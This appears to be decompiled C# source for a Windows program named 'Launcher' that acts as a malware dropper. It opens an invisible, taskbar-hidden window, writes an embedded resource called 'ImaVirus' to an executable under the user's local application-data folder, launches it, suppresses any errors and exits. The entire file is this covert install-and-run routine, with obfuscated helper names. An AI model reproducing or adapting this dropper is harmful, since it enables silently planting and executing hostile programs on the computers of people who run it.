using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Launcher.My.Resources;
using Microsoft.VisualBasic.CompilerServices;

[DesignerGenerated]
public class Launcher : Form
{
	private IContainer icontainer_0;

	public Launcher()
	{
		((Form)this).add_Load((EventHandler)Launcher_Load);
		InitializeComponent();
	}

	[STAThread]
	public static void Main()
	{
		Application.Run((Form)(object)Class2.smethod_3().method_0());
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && icontainer_0 != null)
			{
				icontainer_0.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		((Control)this).SuspendLayout();
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		Size clientSize = new Size(10, 10);
		((Form)this).set_ClientSize(clientSize);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_MaximizeBox(false);
		clientSize = new Size(10, 10);
		((Form)this).set_MaximumSize(clientSize);
		((Form)this).set_MinimizeBox(false);
		clientSize = new Size(10, 10);
		((Form)this).set_MinimumSize(clientSize);
		((Control)this).set_Name("Launcher");
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_SizeGripStyle((SizeGripStyle)2);
		((Form)this).set_Text(".");
		((Form)this).set_WindowState((FormWindowState)1);
		((Control)this).ResumeLayout(false);
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	private void Launcher_Load(object sender, EventArgs e)
	{
		string text = Environment.GetEnvironmentVariable("LOCALAPPDATA") + "\\ImaVirus";
		string text2 = "ImaVirus.exe";
		try
		{
			if (Directory.Exists(text))
			{
				if (File.Exists(text + "\\" + text2))
				{
					File.Delete(text + "\\" + text2);
				}
			}
			else
			{
				Directory.CreateDirectory(text);
			}
			File.WriteAllBytes(text + "\\" + text2, Resources.ImaVirus);
			Process.Start(text + "\\" + text2);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		((Form)this).Close();
		ProjectData.EndApp();
	}
}
